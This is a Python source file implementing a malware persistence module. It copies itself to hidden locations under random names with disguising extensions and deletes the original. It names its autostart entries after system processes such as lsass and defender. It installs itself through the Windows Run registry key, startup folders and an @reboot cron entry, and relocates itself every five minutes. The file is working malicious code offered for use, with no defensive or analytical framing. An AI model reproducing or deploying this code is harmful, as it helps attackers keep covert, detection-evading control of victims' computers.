"""
Persistence mechanisms for maintaining execution across reboots.
"""
import os
import sys
import shutil
import random
import string
import threading
import time
from pathlib import Path

try:
    import winreg
except ImportError:
    winreg = None

class PersistenceManager:
    def __init__(self):
        self.platform = sys.platform
        self.script_path = os.path.abspath(sys.argv[0])
    
    def _generate_random_name(self, length: int = 8) -> str:
        """Generate random filename for stealth."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _get_stealth_locations(self) -> list:
        """Get list of stealthy locations for file placement."""
        if self.platform == "win32":
            return [
                os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp')),
                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp'),
                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows'),
                os.path.join(os.environ['USERPROFILE'], 'Documents'),
                os.path.join(os.environ['USERPROFILE'], 'Downloads'),
                os.path.join(os.environ['USERPROFILE'], 'Desktop'),
                os.path.join(os.environ['SYSTEMROOT'], 'System32'),
            ]
        else:
            return [
                '/tmp',
                os.path.expanduser('~/.cache'),
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Downloads'),
                os.path.expanduser('~/Desktop'),
            ]
    
    def _get_stealth_names(self) -> list:
        """Get list of stealthy process names."""
        return [
            'svchost', 'winlogon', 'csrss', 'lsass', 'wininit',
            'services', 'spoolsv', 'explorer', 'taskmgr', 'msconfig',
            'system', 'kernel', 'update', 'security', 'defender'
        ]
    
    def add_registry_persistence(self, file_path: str) -> bool:
        """Add persistence via Windows registry."""
        if not winreg or self.platform != "win32":
            return False
        
        try:
            # Use stealthy name
            service_name = random.choice(self._get_stealth_names())
            
            # Determine Python executable
            python_exe = sys.executable
            if python_exe.endswith('python.exe'):
                python_exe = python_exe.replace('python.exe', 'pythonw.exe')
            
            # Registry command
            cmd = f'"{python_exe}" "{file_path}"'
            
            # Add to Run key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            
            return True
        except Exception:
            return False
    
    def add_startup_folder_persistence(self, file_path: str) -> bool:
        """Add persistence via startup folder."""
        try:
            if self.platform == "win32":
                startup_path = os.path.join(
                    os.environ['APPDATA'],
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
            else:
                startup_path = os.path.expanduser('~/.config/autostart')
            
            if not os.path.exists(startup_path):
                os.makedirs(startup_path, exist_ok=True)
            
            # Create shortcut or copy file
            target_path = os.path.join(startup_path, f"{self._generate_random_name()}.py")
            shutil.copy2(file_path, target_path)
            
            return True
        except Exception:
            return False
    
    def add_cron_persistence(self, file_path: str) -> bool:
        """Add persistence via cron (Unix/Linux)."""
        if self.platform == "win32":
            return False
        
        try:
            import subprocess
            
            # Add to user's crontab
            cron_entry = f"@reboot python3 {file_path} > /dev/null 2>&1"
            
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            # Add new entry if not present
            if cron_entry not in current_cron:
                new_cron = current_cron + "\n" + cron_entry + "\n"
                subprocess.run(['crontab', '-'], input=new_cron, text=True)
            
            return True
        except Exception:
            return False
    
    def move_to_random_location(self) -> str:
        """Move script to random location and return new path."""
        try:
            locations = self._get_stealth_locations()
            target_dir = random.choice(locations)
            
            if not os.path.exists(target_dir):
                os.makedirs(target_dir, exist_ok=True)
            
            # Generate stealthy filename
            extensions = ['.py', '.exe', '.dll', '.sys', '.dat']
            ext = random.choice(extensions)
            filename = f"{self._generate_random_name()}{ext}"
            
            target_path = os.path.join(target_dir, filename)
            shutil.copy2(self.script_path, target_path)
            
            # Remove original if possible
            try:
                if target_path != self.script_path:
                    os.remove(self.script_path)
            except:
                pass
            
            return target_path
        except Exception:
            return self.script_path
    
    def establish_persistence(self) -> bool:
        """Establish multiple persistence mechanisms."""
        success = False
        
        # Move to random location first
        new_path = self.move_to_random_location()
        
        # Try registry persistence (Windows)
        if self.platform == "win32":
            success |= self.add_registry_persistence(new_path)
        
        # Try startup folder
        success |= self.add_startup_folder_persistence(new_path)
        
        # Try cron persistence (Unix/Linux)
        success |= self.add_cron_persistence(new_path)
        
        return success
    
    def start_periodic_movement(self, interval: int = 300):
        """Start periodic movement of the script."""
        def move_periodically():
            while True:
                time.sleep(interval)
                try:
                    self.move_to_random_location()
                except:
                    pass
        
        thread = threading.Thread(target=move_periodically, daemon=True)
        thread.start()
        return thread 